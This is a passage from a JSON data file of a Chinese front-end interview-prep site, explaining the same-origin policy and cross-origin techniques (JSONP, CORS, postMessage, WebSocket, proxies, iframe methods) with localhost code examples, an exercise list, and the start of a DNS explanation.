    "explanation": "## 一、什么是跨域？\n\n### 1.什么是同源策略及其限制内容？\n\n同源策略是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到XSS、CSRF等攻击。所谓同源是指\"协议+域名+端口\"三者相同，即便两个不同的域名指向同一个ip地址，也非同源。\n\n![url的组成](https://static.ecool.fun//article/82f66b82-02dc-47a9-939e-d9973b5d97b7.awebp)\n\n**同源策略限制内容有：**\n\n* Cookie、LocalStorage、IndexedDB 等存储性内容\n* DOM 节点\n* AJAX 请求发送后，结果被浏览器拦截了\n\n但是有三个标签是允许跨域加载资源：\n\n* `<img src=XXX>`\n* `<link href=XXX>`\n* `<script src=XXX>`\n\n### 2.常见跨域场景\n\n**当协议、子域名、主域名、端口号中任意一个不相同时，都算作不同域**。不同域之间相互请求资源，就算作“跨域”。常见跨域场景如下图所示：\n\n![](https://static.ecool.fun//article/e4d1d8f1-bedc-4e72-87eb-25c870411d05.awebp)\n\n特别说明两点：\n\n**第一：如果是协议和端口造成的跨域问题“前台”是无能为力的。**\n\n**第二：在跨域问题上，仅仅是通过“URL的首部”来识别而不会根据域名对应的IP地址是否相同来判断。“URL的首部”可以理解为“协议, 域名和端口必须匹配”**。\n\n这里你或许有个疑问：**请求跨域了，那么请求到底发出去没有？**\n\n**跨域并不是请求发不出去，请求能发出去，服务端能收到请求并正常返回结果，只是结果被浏览器拦截了**。你可能会疑问明明通过表单的方式可以发起跨域请求，为什么 Ajax 就不会?因为归根结底，跨域是为了阻止用户读取到另一个域名下的内容，Ajax 可以获取响应，浏览器认为这不安全，所以拦截了响应。但是表单并不会获取新的内容，所以可以发起跨域请求。同时也说明了跨域并不能完全阻止 CSRF，因为请求毕竟是发出去了。\n\n## 二、跨域解决方案\n\n### 1.jsonp\n\n#### 1) JSONP原理\n\n**利用 `<script>` 标签没有跨域限制的漏洞，网页可以得到从其他来源动态产生的 JSON 数据。JSONP请求一定需要对方的服务器做支持才可以。**\n\n#### 2) JSONP和AJAX对比\n\nJSONP和AJAX相同，都是客户端向服务器端发送请求，从服务器端获取数据的方式。但AJAX属于同源策略，JSONP属于非同源策略（跨域请求）\n\n#### 3) JSONP优缺点\n\nJSONP优点是简单兼容性好，可用于解决主流浏览器的跨域数据访问的问题。**缺点是仅支持get方法具有局限性,不安全可能会遭受XSS攻击。**\n\n#### 4) JSONP的实现流程\n\n* 声明一个回调函数，其函数名(如show)当做参数值，要传递给跨域请求数据的服务器，函数形参为要获取目标数据(服务器返回的data)。\n* 创建一个`<script>`标签，把那个跨域的API数据接口地址，赋值给script的src,还要在这个地址中向服务器传递该函数名（可以通过问号传参:?callback=show）。\n* 服务器接收到请求后，需要进行特殊的处理：把传递进来的函数名和它需要给你的数据拼接成一个字符串,例如：传递进去的函数名是show，它准备好的数据是`show('我不爱你')`。\n* 最后服务器把准备的数据通过HTTP协议返回给客户端，客户端再调用执行之前声明的回调函数（show），对返回的数据进行操作。\n\n在开发中可能会遇到多个 JSONP 请求的回调函数名是相同的，这时候就需要自己封装一个 JSONP函数。\n\n```\n// index.html\nfunction jsonp({ url, params, callback }) {\n  return new Promise((resolve, reject) => {\n    let script = document.createElement('script')\n    window[callback] = function(data) {\n      resolve(data)\n      document.body.removeChild(script)\n    }\n    params = { ...params, callback } // wd=b&callback=show\n    let arrs = []\n    for (let key in params) {\n      arrs.push(`${key}=${params[key]}`)\n    }\n    script.src = `${url}?${arrs.join('&')}`\n    document.body.appendChild(script)\n  })\n}\njsonp({\n  url: 'http://localhost:3000/say',\n  params: { wd: 'Iloveyou' },\n  callback: 'show'\n}).then(data => {\n  console.log(data)\n})\n\n```\n\n上面这段代码相当于向`http://localhost:3000/say?wd=Iloveyou&callback=show`这个地址请求数据，然后后台返回`show('我不爱你')`，最后会运行show()这个函数，打印出'我不爱你'\n\n```\n// server.js\nlet express = require('express')\nlet app = express()\napp.get('/say', function(req, res) {\n  let { wd, callback } = req.query\n  console.log(wd) // Iloveyou\n  console.log(callback) // show\n  res.end(`${callback}('我不爱你')`)\n})\napp.listen(3000)\n\n```\n\n#### 5) jQuery的jsonp形式\n\n**JSONP都是GET和异步请求的，不存在其他的请求方式和同步请求，且jQuery默认就会给JSONP的请求清除缓存。**\n\n```\n$.ajax({\nurl:\"http://crossdomain.com/jsonServerResponse\",\ndataType:\"jsonp\",\ntype:\"get\",//可以省略\njsonpCallback:\"show\",//->自定义传递给服务器的函数名，而不是使用jQuery自动生成的，可省略\njsonp:\"callback\",//->把传递函数名的那个形参callback，可省略\nsuccess:function (data){\nconsole.log(data);}\n});\n\n```\n\n### 2.cors\n\n**CORS 需要浏览器和后端同时支持。IE 8 和 9 需要通过 XDomainRequest 来实现**。\n\n浏览器会自动进行 CORS 通信，实现 CORS 通信的关键是后端。只要后端实现了 CORS，就实现了跨域。\n\n服务端设置 Access-Control-Allow-Origin 就可以开启 CORS。 该属性表示哪些域名可以访问资源，如果设置通配符则表示所有网站都可以访问资源。\n\n虽然设置 CORS 和前端没什么关系，但是通过这种方式解决跨域问题的话，会在发送请求时出现两种情况，分别为**简单请求**和**复杂请求**。\n\n#### 1) 简单请求\n\n只要同时满足以下两大条件，就属于简单请求\n\n条件1：使用下列方法之一：\n\n* GET\n* HEAD\n* POST\n\n条件2：Content-Type 的值仅限于下列三者之一：\n\n* text/plain\n* multipart/form-data\n* application/x-www-form-urlencoded\n\n请求中的任意 XMLHttpRequestUpload 对象均没有注册任何事件监听器； XMLHttpRequestUpload 对象可以使用 XMLHttpRequest.upload 属性访问。\n\n#### 2) 复杂请求\n\n不符合以上条件的请求就肯定是复杂请求了。\n复杂请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为\"预检\"请求,该请求是 option 方法的，通过该请求来知道服务端是否允许跨域请求。\n\n我们用`PUT`向后台请求时，属于复杂请求，后台需做如下配置：\n\n```\n// 允许哪个方法访问我\nres.setHeader('Access-Control-Allow-Methods', 'PUT')\n// 预检的存活时间\nres.setHeader('Access-Control-Max-Age', 6)\n// OPTIONS请求不做任何处理\nif (req.method === 'OPTIONS') {\n  res.end()\n}\n// 定义后台返回的内容\napp.put('/getData', function(req, res) {\n  console.log(req.headers)\n  res.end('我不爱你')\n})\n\n```\n\n接下来我们看下一个完整复杂请求的例子，并且介绍下CORS请求相关的字段\n\n```\n// index.html\nlet xhr = new XMLHttpRequest()\ndocument.cookie = 'name=xiamen' // cookie不能跨域\nxhr.withCredentials = true // 前端设置是否带cookie\nxhr.open('PUT', 'http://localhost:4000/getData', true)\nxhr.setRequestHeader('name', 'xiamen')\nxhr.onreadystatechange = function() {\n  if (xhr.readyState === 4) {\n    if ((xhr.status >= 200 && xhr.status < 300) || xhr.status === 304) {\n      console.log(xhr.response)\n      //得到响应头，后台需设置Access-Control-Expose-Headers\n      console.log(xhr.getResponseHeader('name'))\n    }\n  }\n}\nxhr.send()\n\n```\n\n```\n//server1.js\nlet express = require('express');\nlet app = express();\napp.use(express.static(__dirname));\napp.listen(3000);\n\n```\n\n```\n//server2.js\nlet express = require('express')\nlet app = express()\nlet whitList = ['http://localhost:3000'] //设置白名单\napp.use(function(req, res, next) {\n  let origin = req.headers.origin\n  if (whitList.includes(origin)) {\n    // 设置哪个源可以访问我\n    res.setHeader('Access-Control-Allow-Origin', origin)\n    // 允许携带哪个头访问我\n    res.setHeader('Access-Control-Allow-Headers', 'name')\n    // 允许哪个方法访问我\n    res.setHeader('Access-Control-Allow-Methods', 'PUT')\n    // 允许携带cookie\n    res.setHeader('Access-Control-Allow-Credentials', true)\n    // 预检的存活时间\n    res.setHeader('Access-Control-Max-Age', 6)\n    // 允许返回的头\n    res.setHeader('Access-Control-Expose-Headers', 'name')\n    if (req.method === 'OPTIONS') {\n      res.end() // OPTIONS请求不做任何处理\n    }\n  }\n  next()\n})\napp.put('/getData', function(req, res) {\n  console.log(req.headers)\n  res.setHeader('name', 'jw') //返回一个响应头，后台需设置\n  res.end('我不爱你')\n})\napp.get('/getData', function(req, res) {\n  console.log(req.headers)\n  res.end('我不爱你')\n})\napp.use(express.static(__dirname))\napp.listen(4000)\n\n```\n\n上述代码由`http://localhost:3000/index.html`向`http://localhost:4000/`跨域请求，正如我们上面所说的，后端是实现 CORS 通信的关键。\n\n### 3.postMessage\n\npostMessage是HTML5 XMLHttpRequest Level 2中的API，且是为数不多可以跨域操作的window属性之一，它可用于解决以下方面的问题：\n\n* 页面和其打开的新窗口的数据传递\n* 多窗口之间消息传递\n* 页面与嵌套的iframe消息传递\n* 上面三个场景的跨域数据传递\n\n**postMessage()方法允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文本档、多窗口、跨域消息传递**。\n\n> otherWindow.postMessage(message, targetOrigin, [transfer]);\n\n* message: 将要发送到其他 window的数据。\n* targetOrigin:通过窗口的origin属性来指定哪些窗口能接收到消息事件，其值可以是字符串\"\\*\"（表示无限制）或者一个URI。在发送消息的时候，如果目标窗口的协议、主机地址或端口这三者的任意一项不匹配targetOrigin提供的值，那么消息就不会被发送；只有三者完全匹配，消息才会被发送。\n* transfer(可选)：是一串和message 同时传递的 Transferable 对象. 这些对象的所有权将被转移给消息的接收方，而发送一方将不再保有所有权。\n\n接下来我们看个例子： `http://localhost:3000/a.html`页面向`http://localhost:4000/b.html`传递“我爱你”,然后后者传回\"我不爱你\"。\n\n```\n// a.html\n  <iframe src=\"http://localhost:4000/b.html\" frameborder=\"0\" id=\"frame\" onload=\"load()\"></iframe> //等它加载完触发一个事件\n  //内嵌在http://localhost:3000/a.html\n    <script>\n      function load() {\n        let frame = document.getElementById('frame')\n        frame.contentWindow.postMessage('我爱你', 'http://localhost:4000') //发送数据\n        window.onmessage = function(e) { //接受返回数据\n          console.log(e.data) //我不爱你\n        }\n      }\n    </script>\n\n```\n\n```\n// b.html\n  window.onmessage = function(e) {\n    console.log(e.data) //我爱你\n    e.source.postMessage('我不爱你', e.origin)\n }\n\n```\n\n### 4.websocket\n\nWebsocket是HTML5的一个持久化的协议，它实现了浏览器与服务器的全双工通信，同时也是跨域的一种解决方案。WebSocket和HTTP都是应用层协议，都基于 TCP 协议。但是 **WebSocket 是一种双向通信协议，在建立连接之后，WebSocket 的 server 与 client 都能主动向对方发送或接收数据**。同时，WebSocket 在建立连接时需要借助 HTTP 协议，连接建立好了之后 client 与 server 之间的双向通信就与 HTTP 无关了。\n\n原生WebSocket API使用起来不太方便，我们使用`Socket.io`，它很好地封装了webSocket接口，提供了更简单、灵活的接口，也对不支持webSocket的浏览器提供了向下兼容。\n\n我们先来看个例子：本地文件socket.html向`localhost:3000`发生数据和接受数据\n\n```\n// socket.html\n<script>\n    let socket = new WebSocket('ws://localhost:3000');\n    socket.onopen = function () {\n      socket.send('我爱你');//向服务器发送数据\n    }\n    socket.onmessage = function (e) {\n      console.log(e.data);//接收服务器返回的数据\n    }\n</script>\n\n```\n\n```\n// server.js\nlet express = require('express');\nlet app = express();\nlet WebSocket = require('ws');//记得安装ws\nlet wss = new WebSocket.Server({port:3000});\nwss.on('connection',function(ws) {\n  ws.on('message', function (data) {\n    console.log(data);\n    ws.send('我不爱你')\n  });\n})\n\n```\n\n### 5. Node中间件代理(两次跨域)\n\n实现原理：**同源策略是浏览器需要遵循的标准，而如果是服务器向服务器请求就无需遵循同源策略。**\n代理服务器，需要做以下几个步骤：\n\n* 接受客户端请求 。\n* 将请求 转发给服务器。\n* 拿到服务器 响应 数据。\n* 将 响应 转发给客户端。\n  ![](https://static.ecool.fun//article/c3a91e44-9075-4d65-baeb-2f5aa5e4f195.awebp)\n\n我们先来看个例子：本地文件index.html文件，通过代理服务器`http://localhost:3000`向目标服务器`http://localhost:4000`请求数据。\n\n```\n// index.html(http://127.0.0.1:5500)\n <script src=\"https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js\"></script>\n    <script>\n      $.ajax({\n        url: 'http://localhost:3000',\n        type: 'post',\n        data: { name: 'xiamen', password: '123456' },\n        contentType: 'application/json;charset=utf-8',\n        success: function(result) {\n          console.log(result) // {\"title\":\"fontend\",\"password\":\"123456\"}\n        },\n        error: function(msg) {\n          console.log(msg)\n        }\n      })\n     </script>\n\n```\n\n```\n// server1.js 代理服务器(http://localhost:3000)\nconst http = require('http')\n// 第一步：接受客户端请求\nconst server = http.createServer((request, response) => {\n  // 代理服务器，直接和浏览器直接交互，需要设置CORS 的首部字段\n  response.writeHead(200, {\n    'Access-Control-Allow-Origin': '*',\n    'Access-Control-Allow-Methods': '*',\n    'Access-Control-Allow-Headers': 'Content-Type'\n  })\n  // 第二步：将请求转发给服务器\n  const proxyRequest = http\n    .request(\n      {\n        host: '127.0.0.1',\n        port: 4000,\n        url: '/',\n        method: request.method,\n        headers: request.headers\n      },\n      serverResponse => {\n        // 第三步：收到服务器的响应\n        var body = ''\n        serverResponse.on('data', chunk => {\n          body += chunk\n        })\n        serverResponse.on('end', () => {\n          console.log('The data is ' + body)\n          // 第四步：将响应结果转发给浏览器\n          response.end(body)\n        })\n      }\n    )\n    .end()\n})\nserver.listen(3000, () => {\n  console.log('The proxyServer is running at http://localhost:3000')\n})\n\n```\n\n```\n// server2.js(http://localhost:4000)\nconst http = require('http')\nconst data = { title: 'fontend', password: '123456' }\nconst server = http.createServer((request, response) => {\n  if (request.url === '/') {\n    response.end(JSON.stringify(data))\n  }\n})\nserver.listen(4000, () => {\n  console.log('The server is running at http://localhost:4000')\n})\n\n```\n\n上述代码经过两次跨域，值得注意的是浏览器向代理服务器发送请求，也遵循同源策略，最后在index.html文件打印出`{\"title\":\"fontend\",\"password\":\"123456\"}`\n\n### 6.nginx反向代理\n\n实现原理类似于Node中间件代理，需要你搭建一个中转nginx服务器，用于转发请求。\n\n使用nginx反向代理实现跨域，是最简单的跨域方式。只需要修改nginx的配置即可解决跨域问题，支持所有浏览器，支持session，不需要修改任何代码，并且不会影响服务器性能。\n\n实现思路：通过nginx配置一个代理服务器（域名与domain1相同，端口不同）做跳板机，反向代理访问domain2接口，并且可以顺便修改cookie中domain信息，方便当前域cookie写入，实现跨域登录。\n\n先下载[nginx](https://link.juejin.cn?target=http%3A%2F%2Fnginx.org%2Fen%2Fdownload.html \"http://nginx.org/en/download.html\")，然后将nginx目录下的nginx.conf修改如下:\n\n```\n// proxy服务器\nserver {\n    listen       81;\n    server_name  www.domain1.com;\n    location / {\n        proxy_pass   http://www.domain2.com:8080;  #反向代理\n        proxy_cookie_domain www.domain2.com www.domain1.com; #修改cookie里域名\n        index  index.html index.htm;\n\n        # 当用webpack-dev-server等中间件代理接口访问nignx时，此时无浏览器参与，故没有同源限制，下面的跨域配置可不启用\n        add_header Access-Control-Allow-Origin http://www.domain1.com;  #当前端只跨域不带cookie时，可为*\n        add_header Access-Control-Allow-Credentials true;\n    }\n}\n\n```\n\n最后通过命令行`nginx -s reload`启动nginx\n\n```\n// index.html\nvar xhr = new XMLHttpRequest();\n// 前端开关：浏览器是否读写cookie\nxhr.withCredentials = true;\n// 访问nginx中的代理服务器\nxhr.open('get', 'http://www.domain1.com:81/?user=admin', true);\nxhr.send();\n\n```\n\n```\n// server.js\nvar http = require('http');\nvar server = http.createServer();\nvar qs = require('querystring');\nserver.on('request', function(req, res) {\n    var params = qs.parse(req.url.substring(2));\n    // 向前台写cookie\n    res.writeHead(200, {\n        'Set-Cookie': 'l=a123456;Path=/;Domain=www.domain2.com;HttpOnly'   // HttpOnly:脚本无法读取\n    });\n    res.write(JSON.stringify(params));\n    res.end();\n});\nserver.listen('8080');\nconsole.log('Server is running at port 8080...');\n\n```\n\n### 7.window.name + iframe\n\nwindow.name属性的独特之处：name值在不同的页面（甚至不同域名）加载后依旧存在，并且可以支持非常长的 name 值（2MB）。\n\n其中a.html和b.html是同域的，都是`http://localhost:3000`;而c.html是`http://localhost:4000`\n\n```\n // a.html(http://localhost:3000/b.html)\n  <iframe src=\"http://localhost:4000/c.html\" frameborder=\"0\" onload=\"load()\" id=\"iframe\"></iframe>\n  <script>\n    let first = true\n    // onload事件会触发2次，第1次加载跨域页，并留存数据于window.name\n    function load() {\n      if(first){\n      // 第1次onload(跨域页)成功后，切换到同域代理页面\n        let iframe = document.getElementById('iframe');\n        iframe.src = 'http://localhost:3000/b.html';\n        first = false;\n      }else{\n      // 第2次onload(同域b.html页)成功后，读取同域window.name中数据\n        console.log(iframe.contentWindow.name);\n      }\n    }\n  </script>\n\n```\n\nb.html为中间代理页，与a.html同域，内容为空。\n\n```\n // c.html(http://localhost:4000/c.html)\n  <script>\n    window.name = '我不爱你'\n  </script>\n\n```\n\n总结：通过iframe的src属性由外域转向本地域，跨域数据即由iframe的window.name从外域传递到本地域。这个就巧妙地绕过了浏览器的跨域访问限制，但同时它又是安全操作。\n\n### 8.location.hash + iframe\n\n实现原理： a.html欲与c.html跨域相互通信，通过中间页b.html来实现。 三个页面，不同域之间利用iframe的location.hash传值，相同域之间直接js访问来通信。\n\n具体实现步骤：一开始a.html给c.html传一个hash值，然后c.html收到hash值后，再把hash值传递给b.html，最后b.html将结果放到a.html的hash值中。\n同样的，a.html和b.html是同域的，都是`http://localhost:3000`;而c.html是`http://localhost:4000`\n\n```\n // a.html\n  <iframe src=\"http://localhost:4000/c.html#iloveyou\"></iframe>\n  <script>\n    window.onhashchange = function () { //检测hash的变化\n      console.log(location.hash);\n    }\n  </script>\n\n```\n\n```\n // b.html\n  <script>\n    window.parent.parent.location.hash = location.hash\n    //b.html将结果放到a.html的hash值中，b.html可通过parent.parent访问a.html页面\n  </script>\n\n```\n\n```\n // c.html\n console.log(location.hash);\n  let iframe = document.createElement('iframe');\n  iframe.src = 'http://localhost:3000/b.html#idontloveyou';\n  document.body.appendChild(iframe);\n\n```\n\n### 9.document.domain + iframe\n\n**该方式只能用于二级域名相同的情况下，比如 `a.test.com` 和 `b.test.com` 适用于该方式**。\n只需要给页面添加 `document.domain ='test.com'` 表示二级域名都相同就可以实现跨域。\n\n实现原理：两个页面都通过js强制设置document.domain为基础主域，就实现了同域。\n\n我们看个例子：页面`a.zf1.cn:3000/a.html`获取页面`b.zf1.cn:3000/b.html`中a的值\n\n```\n// a.html\n<body>\n helloa\n  <iframe src=\"http://b.zf1.cn:3000/b.html\" frameborder=\"0\" onload=\"load()\" id=\"frame\"></iframe>\n  <script>\n    document.domain = 'zf1.cn'\n    function load() {\n      console.log(frame.contentWindow.a);\n    }\n  </script>\n</body>\n\n```\n\n```\n// b.html\n<body>\n   hellob\n   <script>\n     document.domain = 'zf1.cn'\n     var a = 100;\n   </script>\n</body>\n\n```\n\n## 三、总结\n\n* CORS支持所有类型的HTTP请求，是跨域HTTP请求的根本解决方案\n* JSONP只支持GET请求，JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。\n* 不管是Node中间件代理还是nginx反向代理，主要是通过同源策略对服务器不加限制。\n* 日常工作中，用得比较多的跨域方案是cors和nginx反向代理",
    "testPoint": "**跨域（Cross-Origin）问题** 是前端面试中高频且必须掌握的考察方向。它不仅涉及**浏览器同源策略的理解**，还包括**常见跨域方案的原理、优缺点、安全性、使用场景等**。  \n\n## 一、核心概念考察\n\n### 1. **什么是跨域？**\n\n* 浏览器基于 **同源策略**，阻止来自不同源的脚本访问当前页面的资源。\n* 所谓“同源”是指：\n\n  ```\n  协议(protocol)、域名(host)、端口(port) 三者相同\n  ```\n\n### 2. **常见的跨域类型**\n\n| 类型   | 举例                                        |\n| ---- | ----------------------------------------- |\n| 协议不同 | `http://a.com` → `https://a.com`          |\n| 域名不同 | `http://a.com` → `http://b.com`           |\n| 子域不同 | `http://a.com` → `http://api.a.com`       |\n| 端口不同 | `http://a.com:8080` → `http://a.com:3000` |\n\n## 二、浏览器同源策略考察点\n\n* **限制了哪些内容？**\n\n  * Cookie、LocalStorage、IndexedDB 不可共享\n  * DOM 访问限制（iframe 内容不可操作）\n  * AJAX 请求拦截（最常见）\n* **什么情况下会触发跨域？**\n\n  * 脚本或前端代码主动向非同源地址发起请求\n\n## 三、常见跨域解决方案（重点）\n\n| 方法              | 是否需要后端配合   | 原理                     | 优缺点概括                                 |\n| --------------- | ---------- | ---------------------- | ------------------------------------- |\n| CORS（主流方案）      | ✅ 是        | 服务端设置响应头允许跨域           | 安全、标准，支持复杂请求                          |\n| JSONP           | ❌ 否（只 GET） | 利用 `<script>` 标签不受同源限制 | 只能 `GET`，不安全，过时                       |\n| 代理转发（反向代理）      | ✅ 是        | 浏览器认为同源，服务端代理转发        | 常用于本地开发，兼容性好                          |\n| postMessage     | ❌ 否        | iframe 或窗口间通信          | 适用于页面嵌套（iframe、子窗口）                   |\n| WebSocket       | ✅ 是        | 不受同源策略限制               | 适用于实时通信场景                             |\n| document.domain | ❌ 否        | 修改主域保持一致               | 仅限于相同主域名（如 `a.xxx.com` 与 `b.xxx.com`） |\n| window\\.name    | ❌ 否        | name 属性可跨域传值           | 较冷门，用于 iframe 通信                      |\n| location.hash   | ❌ 否        | 父子窗口通过 hash 通信         | 仅用于 iframe 简单通信                       |\n\n## 四、CORS 细节考察（重点）\n\n| 项目          | 内容                                                                                             |\n| ----------- | ---------------------------------------------------------------------------------------------- |\n| 简单请求        | GET、POST（Content-Type: `application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`） |\n| 复杂请求        | 其他请求方法或自定义头部时会触发 **预检请求（OPTIONS）**                                                             |\n| 服务端关键响应头    | `Access-Control-Allow-Origin`、`Access-Control-Allow-Methods`、`Access-Control-Allow-Headers`    |\n| 是否携带 cookie | 需要前端 `withCredentials: true`，后端加 `Access-Control-Allow-Credentials: true`                      |\n| 通配符限制       | 携带 Cookie 时，`Access-Control-Allow-Origin` 不可为 `*`                                              |\n\n## 五、开发场景与工具配置\n\n| 案例方向                 | 举例                    |\n| -------------------- | --------------------- |\n| Webpack devServer 代理 | 用于本地开发阶段，解决接口跨域       |\n| nginx 反向代理           | 生产环境使用，后端统一代理         |\n| 前后端分离架构              | CORS 是主流解决方案          |\n| iframe 嵌套通信          | 使用 `postMessage` 安全传值 |\n\n## 六、安全性考察点\n\n| 问题                   | 原因                                          |\n| -------------------- | ------------------------------------------- |\n| CORS 误配置风险           | 设置 `Access-Control-Allow-Origin: *` 时泄露敏感数据 |\n| JSONP 存在注入风险         | JSONP 数据未校验可能导致 XSS 攻击                      |\n| `withCredentials` 滥用 | 可能造成跨域 Cookie 泄露                            |\n\n## 七、面试常见问题汇总\n\n| 问题                   | 涉及考点                    |\n| -------------------- | ----------------------- |\n| 什么是跨域？浏览器为什么会有跨域限制？  | 同源策略                    |\n| 跨域请求有哪些常用的解决方案？      | CORS、代理、JSONP           |\n| CORS 中的预检请求是怎么回事？    | OPTIONS 请求机制            |\n| 如何在开发阶段解决跨域问题？       | devServer 代理、nginx 反向代理 |\n| JSONP 的原理及优缺点？       | `<script>` 标签绕过限制       |\n| 前端如何安全地进行 iframe 通信？ | `postMessage` 使用        |\n| 跨域请求如何携带 Cookie？     | `withCredentials` 设置规则  |\n| 服务端如何设置 CORS 响应头？    | `Access-Control-*` 系列头  |\n",
    "exerciseKeyList": "[\"6843e240-9534-4371-8b64-ba76b4aa8ed4\",\"ce6357ce-cce3-4ccc-90d8-7fe7704f3312\",\"20f1385d-4442-43c5-bb20-2a53a9bfc6c6\",\"3f9c98d1-28f5-46fe-ba4b-ee7d9f6107cf\",\"b18e3951-44d8-4347-b429-805ede23b706\",\"e41a4651-2c23-43c7-853c-cdf6039325f6\",\"56e56a05-99c7-4701-ae72-e06d2c6a4d42\",\"87408912-b244-4727-951c-65993c6dbcff\",\"b4001078-1e40-481b-8fcd-c4d48e6dd855\",\"03d5dfc7-9bb9-4129-9145-b4da4d4fa11f\",\"38c7340e-cb35-43e0-8ea0-20e75b2780a5\",\"3538f4eb-5b78-4ffc-aeae-ccfdd45976a4\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-07-28T03:59:55.000Z",
    "updateAt": "2025-08-06T07:51:45.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "03d5dfc7-9bb9-4129-9145-b4da4d4fa11f",
        "title": "说说webpack proxy工作原理？为什么能解决跨域?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T15:33:37.000Z",
        "updateAt": "2024-01-25T19:07:54.000Z"
      },
      {
        "exerciseKey": "20f1385d-4442-43c5-bb20-2a53a9bfc6c6",
        "title": "JSONP 是如何实现跨域的?",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2024-08-14T12:17:52.000Z"
      },
      {
        "exerciseKey": "3538f4eb-5b78-4ffc-aeae-ccfdd45976a4",
        "title": "什么是跨域？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:49:49.000Z",
        "updateAt": "2024-08-10T17:04:48.000Z"
      },
      {
        "exerciseKey": "38c7340e-cb35-43e0-8ea0-20e75b2780a5",
        "title": "Vue项目中如何解决跨域问题？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:51:10.000Z",
        "updateAt": "2024-08-10T17:04:48.000Z"
      },
      {
        "exerciseKey": "3f9c98d1-28f5-46fe-ba4b-ee7d9f6107cf",
        "title": "在域名 A 的网站上，跨域请求域名 B 上的接口，怎么在跨域请求中携带域名 B 的 Cookie 呢？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:14.000Z",
        "updateAt": "2024-10-30T01:37:42.000Z"
      },
      {
        "exerciseKey": "56e56a05-99c7-4701-ae72-e06d2c6a4d42",
        "title": "前端怎么实现跨域请求？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-15T15:50:15.000Z",
        "updateAt": "2024-08-10T17:06:17.000Z"
      },
      {
        "exerciseKey": "6843e240-9534-4371-8b64-ba76b4aa8ed4",
        "title": "postMessage 是如何解决跨域问题的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2024-08-14T12:15:18.000Z"
      },
      {
        "exerciseKey": "87408912-b244-4727-951c-65993c6dbcff",
        "title": "怎么解决canvas中获取跨域图片数据的问题？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-08T15:35:58.000Z",
        "updateAt": "2024-08-10T17:06:15.000Z"
      },
      {
        "exerciseKey": "b18e3951-44d8-4347-b429-805ede23b706",
        "title": "浏览器有同源策略，但是为什么我们可以将静态资源放到 CDN 上，使用不同的域名访问，这不会有跨域限制吗？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:29:51.000Z",
        "updateAt": "2025-04-07T08:32:51.000Z"
      },
      {
        "exerciseKey": "b4001078-1e40-481b-8fcd-c4d48e6dd855",
        "title": "浏览器为什么要有跨域限制？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T02:49:50.000Z",
        "updateAt": "2024-08-10T17:05:47.000Z"
      },
      {
        "exerciseKey": "ce6357ce-cce3-4ccc-90d8-7fe7704f3312",
        "title": "CORS 是如何实现跨域的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2025-07-16T12:44:36.000Z"
      },
      {
        "exerciseKey": "e41a4651-2c23-43c7-853c-cdf6039325f6",
        "title": "跨域时怎么处理 cookie？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-07-17T11:34:09.000Z",
        "updateAt": "2024-08-10T17:06:49.000Z"
      }
    ]
  },
  "235": {
    "id": 235,
    "tagId": 16,
    "title": "DNS解析",
    "explanation": "TCP/IP提供了通过 `IP地址` 来连接到设备的功能，但对用户来讲，记住某台设备的IP地址是相当困难的，因此专门设计了一种字符串形式的主机命名机制，这些主机名与IP地址相对应。在IP地址与主机名之间需要有一种转换和查询机制，提供这种机制的系统就是域名系统DNS（Domain Name System）。\n\n## 为什么要有DNS？\n\n互联网中，一台计算机与其他计算机通信时，通过 `IP地址` 唯一的标志自己。此时的IP地址就类似于我们日常生活中的电话号码。但是，这种纯数字的标识是比较难记忆的，而且数量也比较庞大。例如，每个IPv4地址是一个32位长的二进制数字，或者采用点分十进制展示成192.168.1.1这种格式，有接近43亿个的IPv4地址。DNS的作用就是将人类可读的名称转换为机器识别的IP地址，供计算机相互连接。DNS的工作原理和电话簿相似，都是管理名称和数字之间的映射关系。就像我们日常打电话，一般使用人名查找，很少直接输入电话号码一样。当我们上网打开某个网页、视频时，也很少直接使用IP地址，而是在浏览器里输入的URL地址，例如：`https://www.huawei.com`，这其实使用的就是计算机的名字，一般称为域名。\n\n## 域名的构成\n\n最初设备的域名由字符序列组成、所有设备的域名组成一个未分级的域名结构。未分级的域名结构存在命名冲突、管理维护复杂的缺点。因此，TCP/IP把DNS的域名设计成了分级的树状结构。每个申请加入Internet的国家都要向NIC注册一个顶级域名，顶级域采用组织模式和地理模式的划分模式，如cn代表中国、us代表美国等。\n\n常见的顶级域名如下表所示。NIC将顶级域的管理权分派给由其指定的管理机构，由这些管理机构再对被授权管理的域继续进行划分，从而形成了二级域。负责划分二级域的管理机构可以授权其下属的管理结构，由它们继续划分域。由此下去，便形成了层次型的Internet域名体系结构。\n\n| 顶级Internet域名 | 含义 |\n| --- | --- |\n| com | 商业组织 |\n| edu | 教育机构 |\n| gov | 政府机构 |\n| mil | 军事部门 |\n| net | 主要网络支持中心 |\n| int | 国际组织 |\n| org | 其他组织 |\n| 国家代码 | 国家（按照地理模式划分） |\n\n从语法上讲，每一个域名都是有标号序列组成，而各标号之间用点（小数点）隔开。以www.huawei.com域名为例，从右到左依次是：\n\n* com：顶级域名。代表商业组织。\n* huawei：二级域名，归属于某个公司自己的域名。\n* www：三级域名，表明某个公司提供的是什么服务，www代表普通网页。\n\n## 